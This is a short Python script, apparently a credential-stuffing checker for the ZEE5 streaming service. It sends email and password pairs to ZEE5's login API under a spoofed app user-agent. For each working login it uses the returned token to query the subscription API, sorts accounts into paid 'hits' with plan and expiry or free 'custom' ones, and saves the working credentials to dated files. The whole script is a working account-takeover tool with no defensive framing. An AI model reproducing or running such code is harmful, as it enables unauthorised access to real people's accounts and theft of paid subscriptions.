import requests,os,datetime,termcolor,colorama,platform,json,time
colorama.init()
custom,hit,bad,date = 0,0,0,datetime.datetime.now()
date = str(date).split(' ')[0]
def clear():
	if platform.system() == "Windows": os.system('cls')
	else: os.system('clear')
def Check(email,password):
	global hit,custom,bad
	r = requests.post('https://userapi.zee5.com//v2/user/loginemail',json = {"email":email,"password":password},headers = {'Content-Type':"application/json",
	"user-agent":"ZEE5/7817 CFNetwork/1312 Darwin/21.0.0"}).text
	if "access_token" in r:
		t = json.loads(r)
		tok = t["access_token"]
		rr = requests.get("https://subscriptionapi.zee5.com//v1/subscription?translation=en&include_all=true",headers = {"authorization":f"Bearer {tok}",
		"user-agent":"ZEE5/7817 CFNetwork/1312 Darwin/21.0.0"}).text
		if "FREE" in rr:
			custom += 1
			print(termcolor.colored(f'{email}:{password}',color = "yellow", attrs = ["bold"]))
			ww = open(f'Zee5_Custom[{date}].txt','a').write(f'{email}:{password}\n')
		elif rr == "[]":
			custom += 1
			print(termcolor.colored(f'{email}:{password}',color = "yellow", attrs = ["bold"]))
			ww = open(f'Zee5_Custom[{date}].txt','a').write(f'{email}:{password}\n')
		else:
			tt = json.loads(rr)
			plan = str(tt).split("original_title': '")[1].split("'")[0]
			Expiry = str(tt).split("subscription_end': '")[1].split('T')[0]
			date_time = datetime.datetime(int(Expiry.split('-')[0]),int(Expiry.split('-')[1]),int(Expiry.split('-')[2]),23,59,59)
			rem = time.mktime(date_time.timetuple())
			remain = (int(rem)-int(time.time()))/86400
			if remain >= 1:
				hit += 1
				print(termcolor.colored(f'[+] {email}:{password} [ Plan = {plan} | Expire = {Expiry} ]',color = "green", attrs = ["bold"]))
				w=open(f'Zee5_Hits[{date}].txt','a').write(f'[+] {email}:{password} [ Plan = {plan} | Expire = {Expiry} ]\n')
			else:
				custom += 1
				print(termcolor.colored(f'{email}:{password}',color = "yellow", attrs = ["bold"]))
				ww = open(f'Zee5_Custom[{date}].txt','a').write(f'{email}:{password}\n')
	else: bad +=1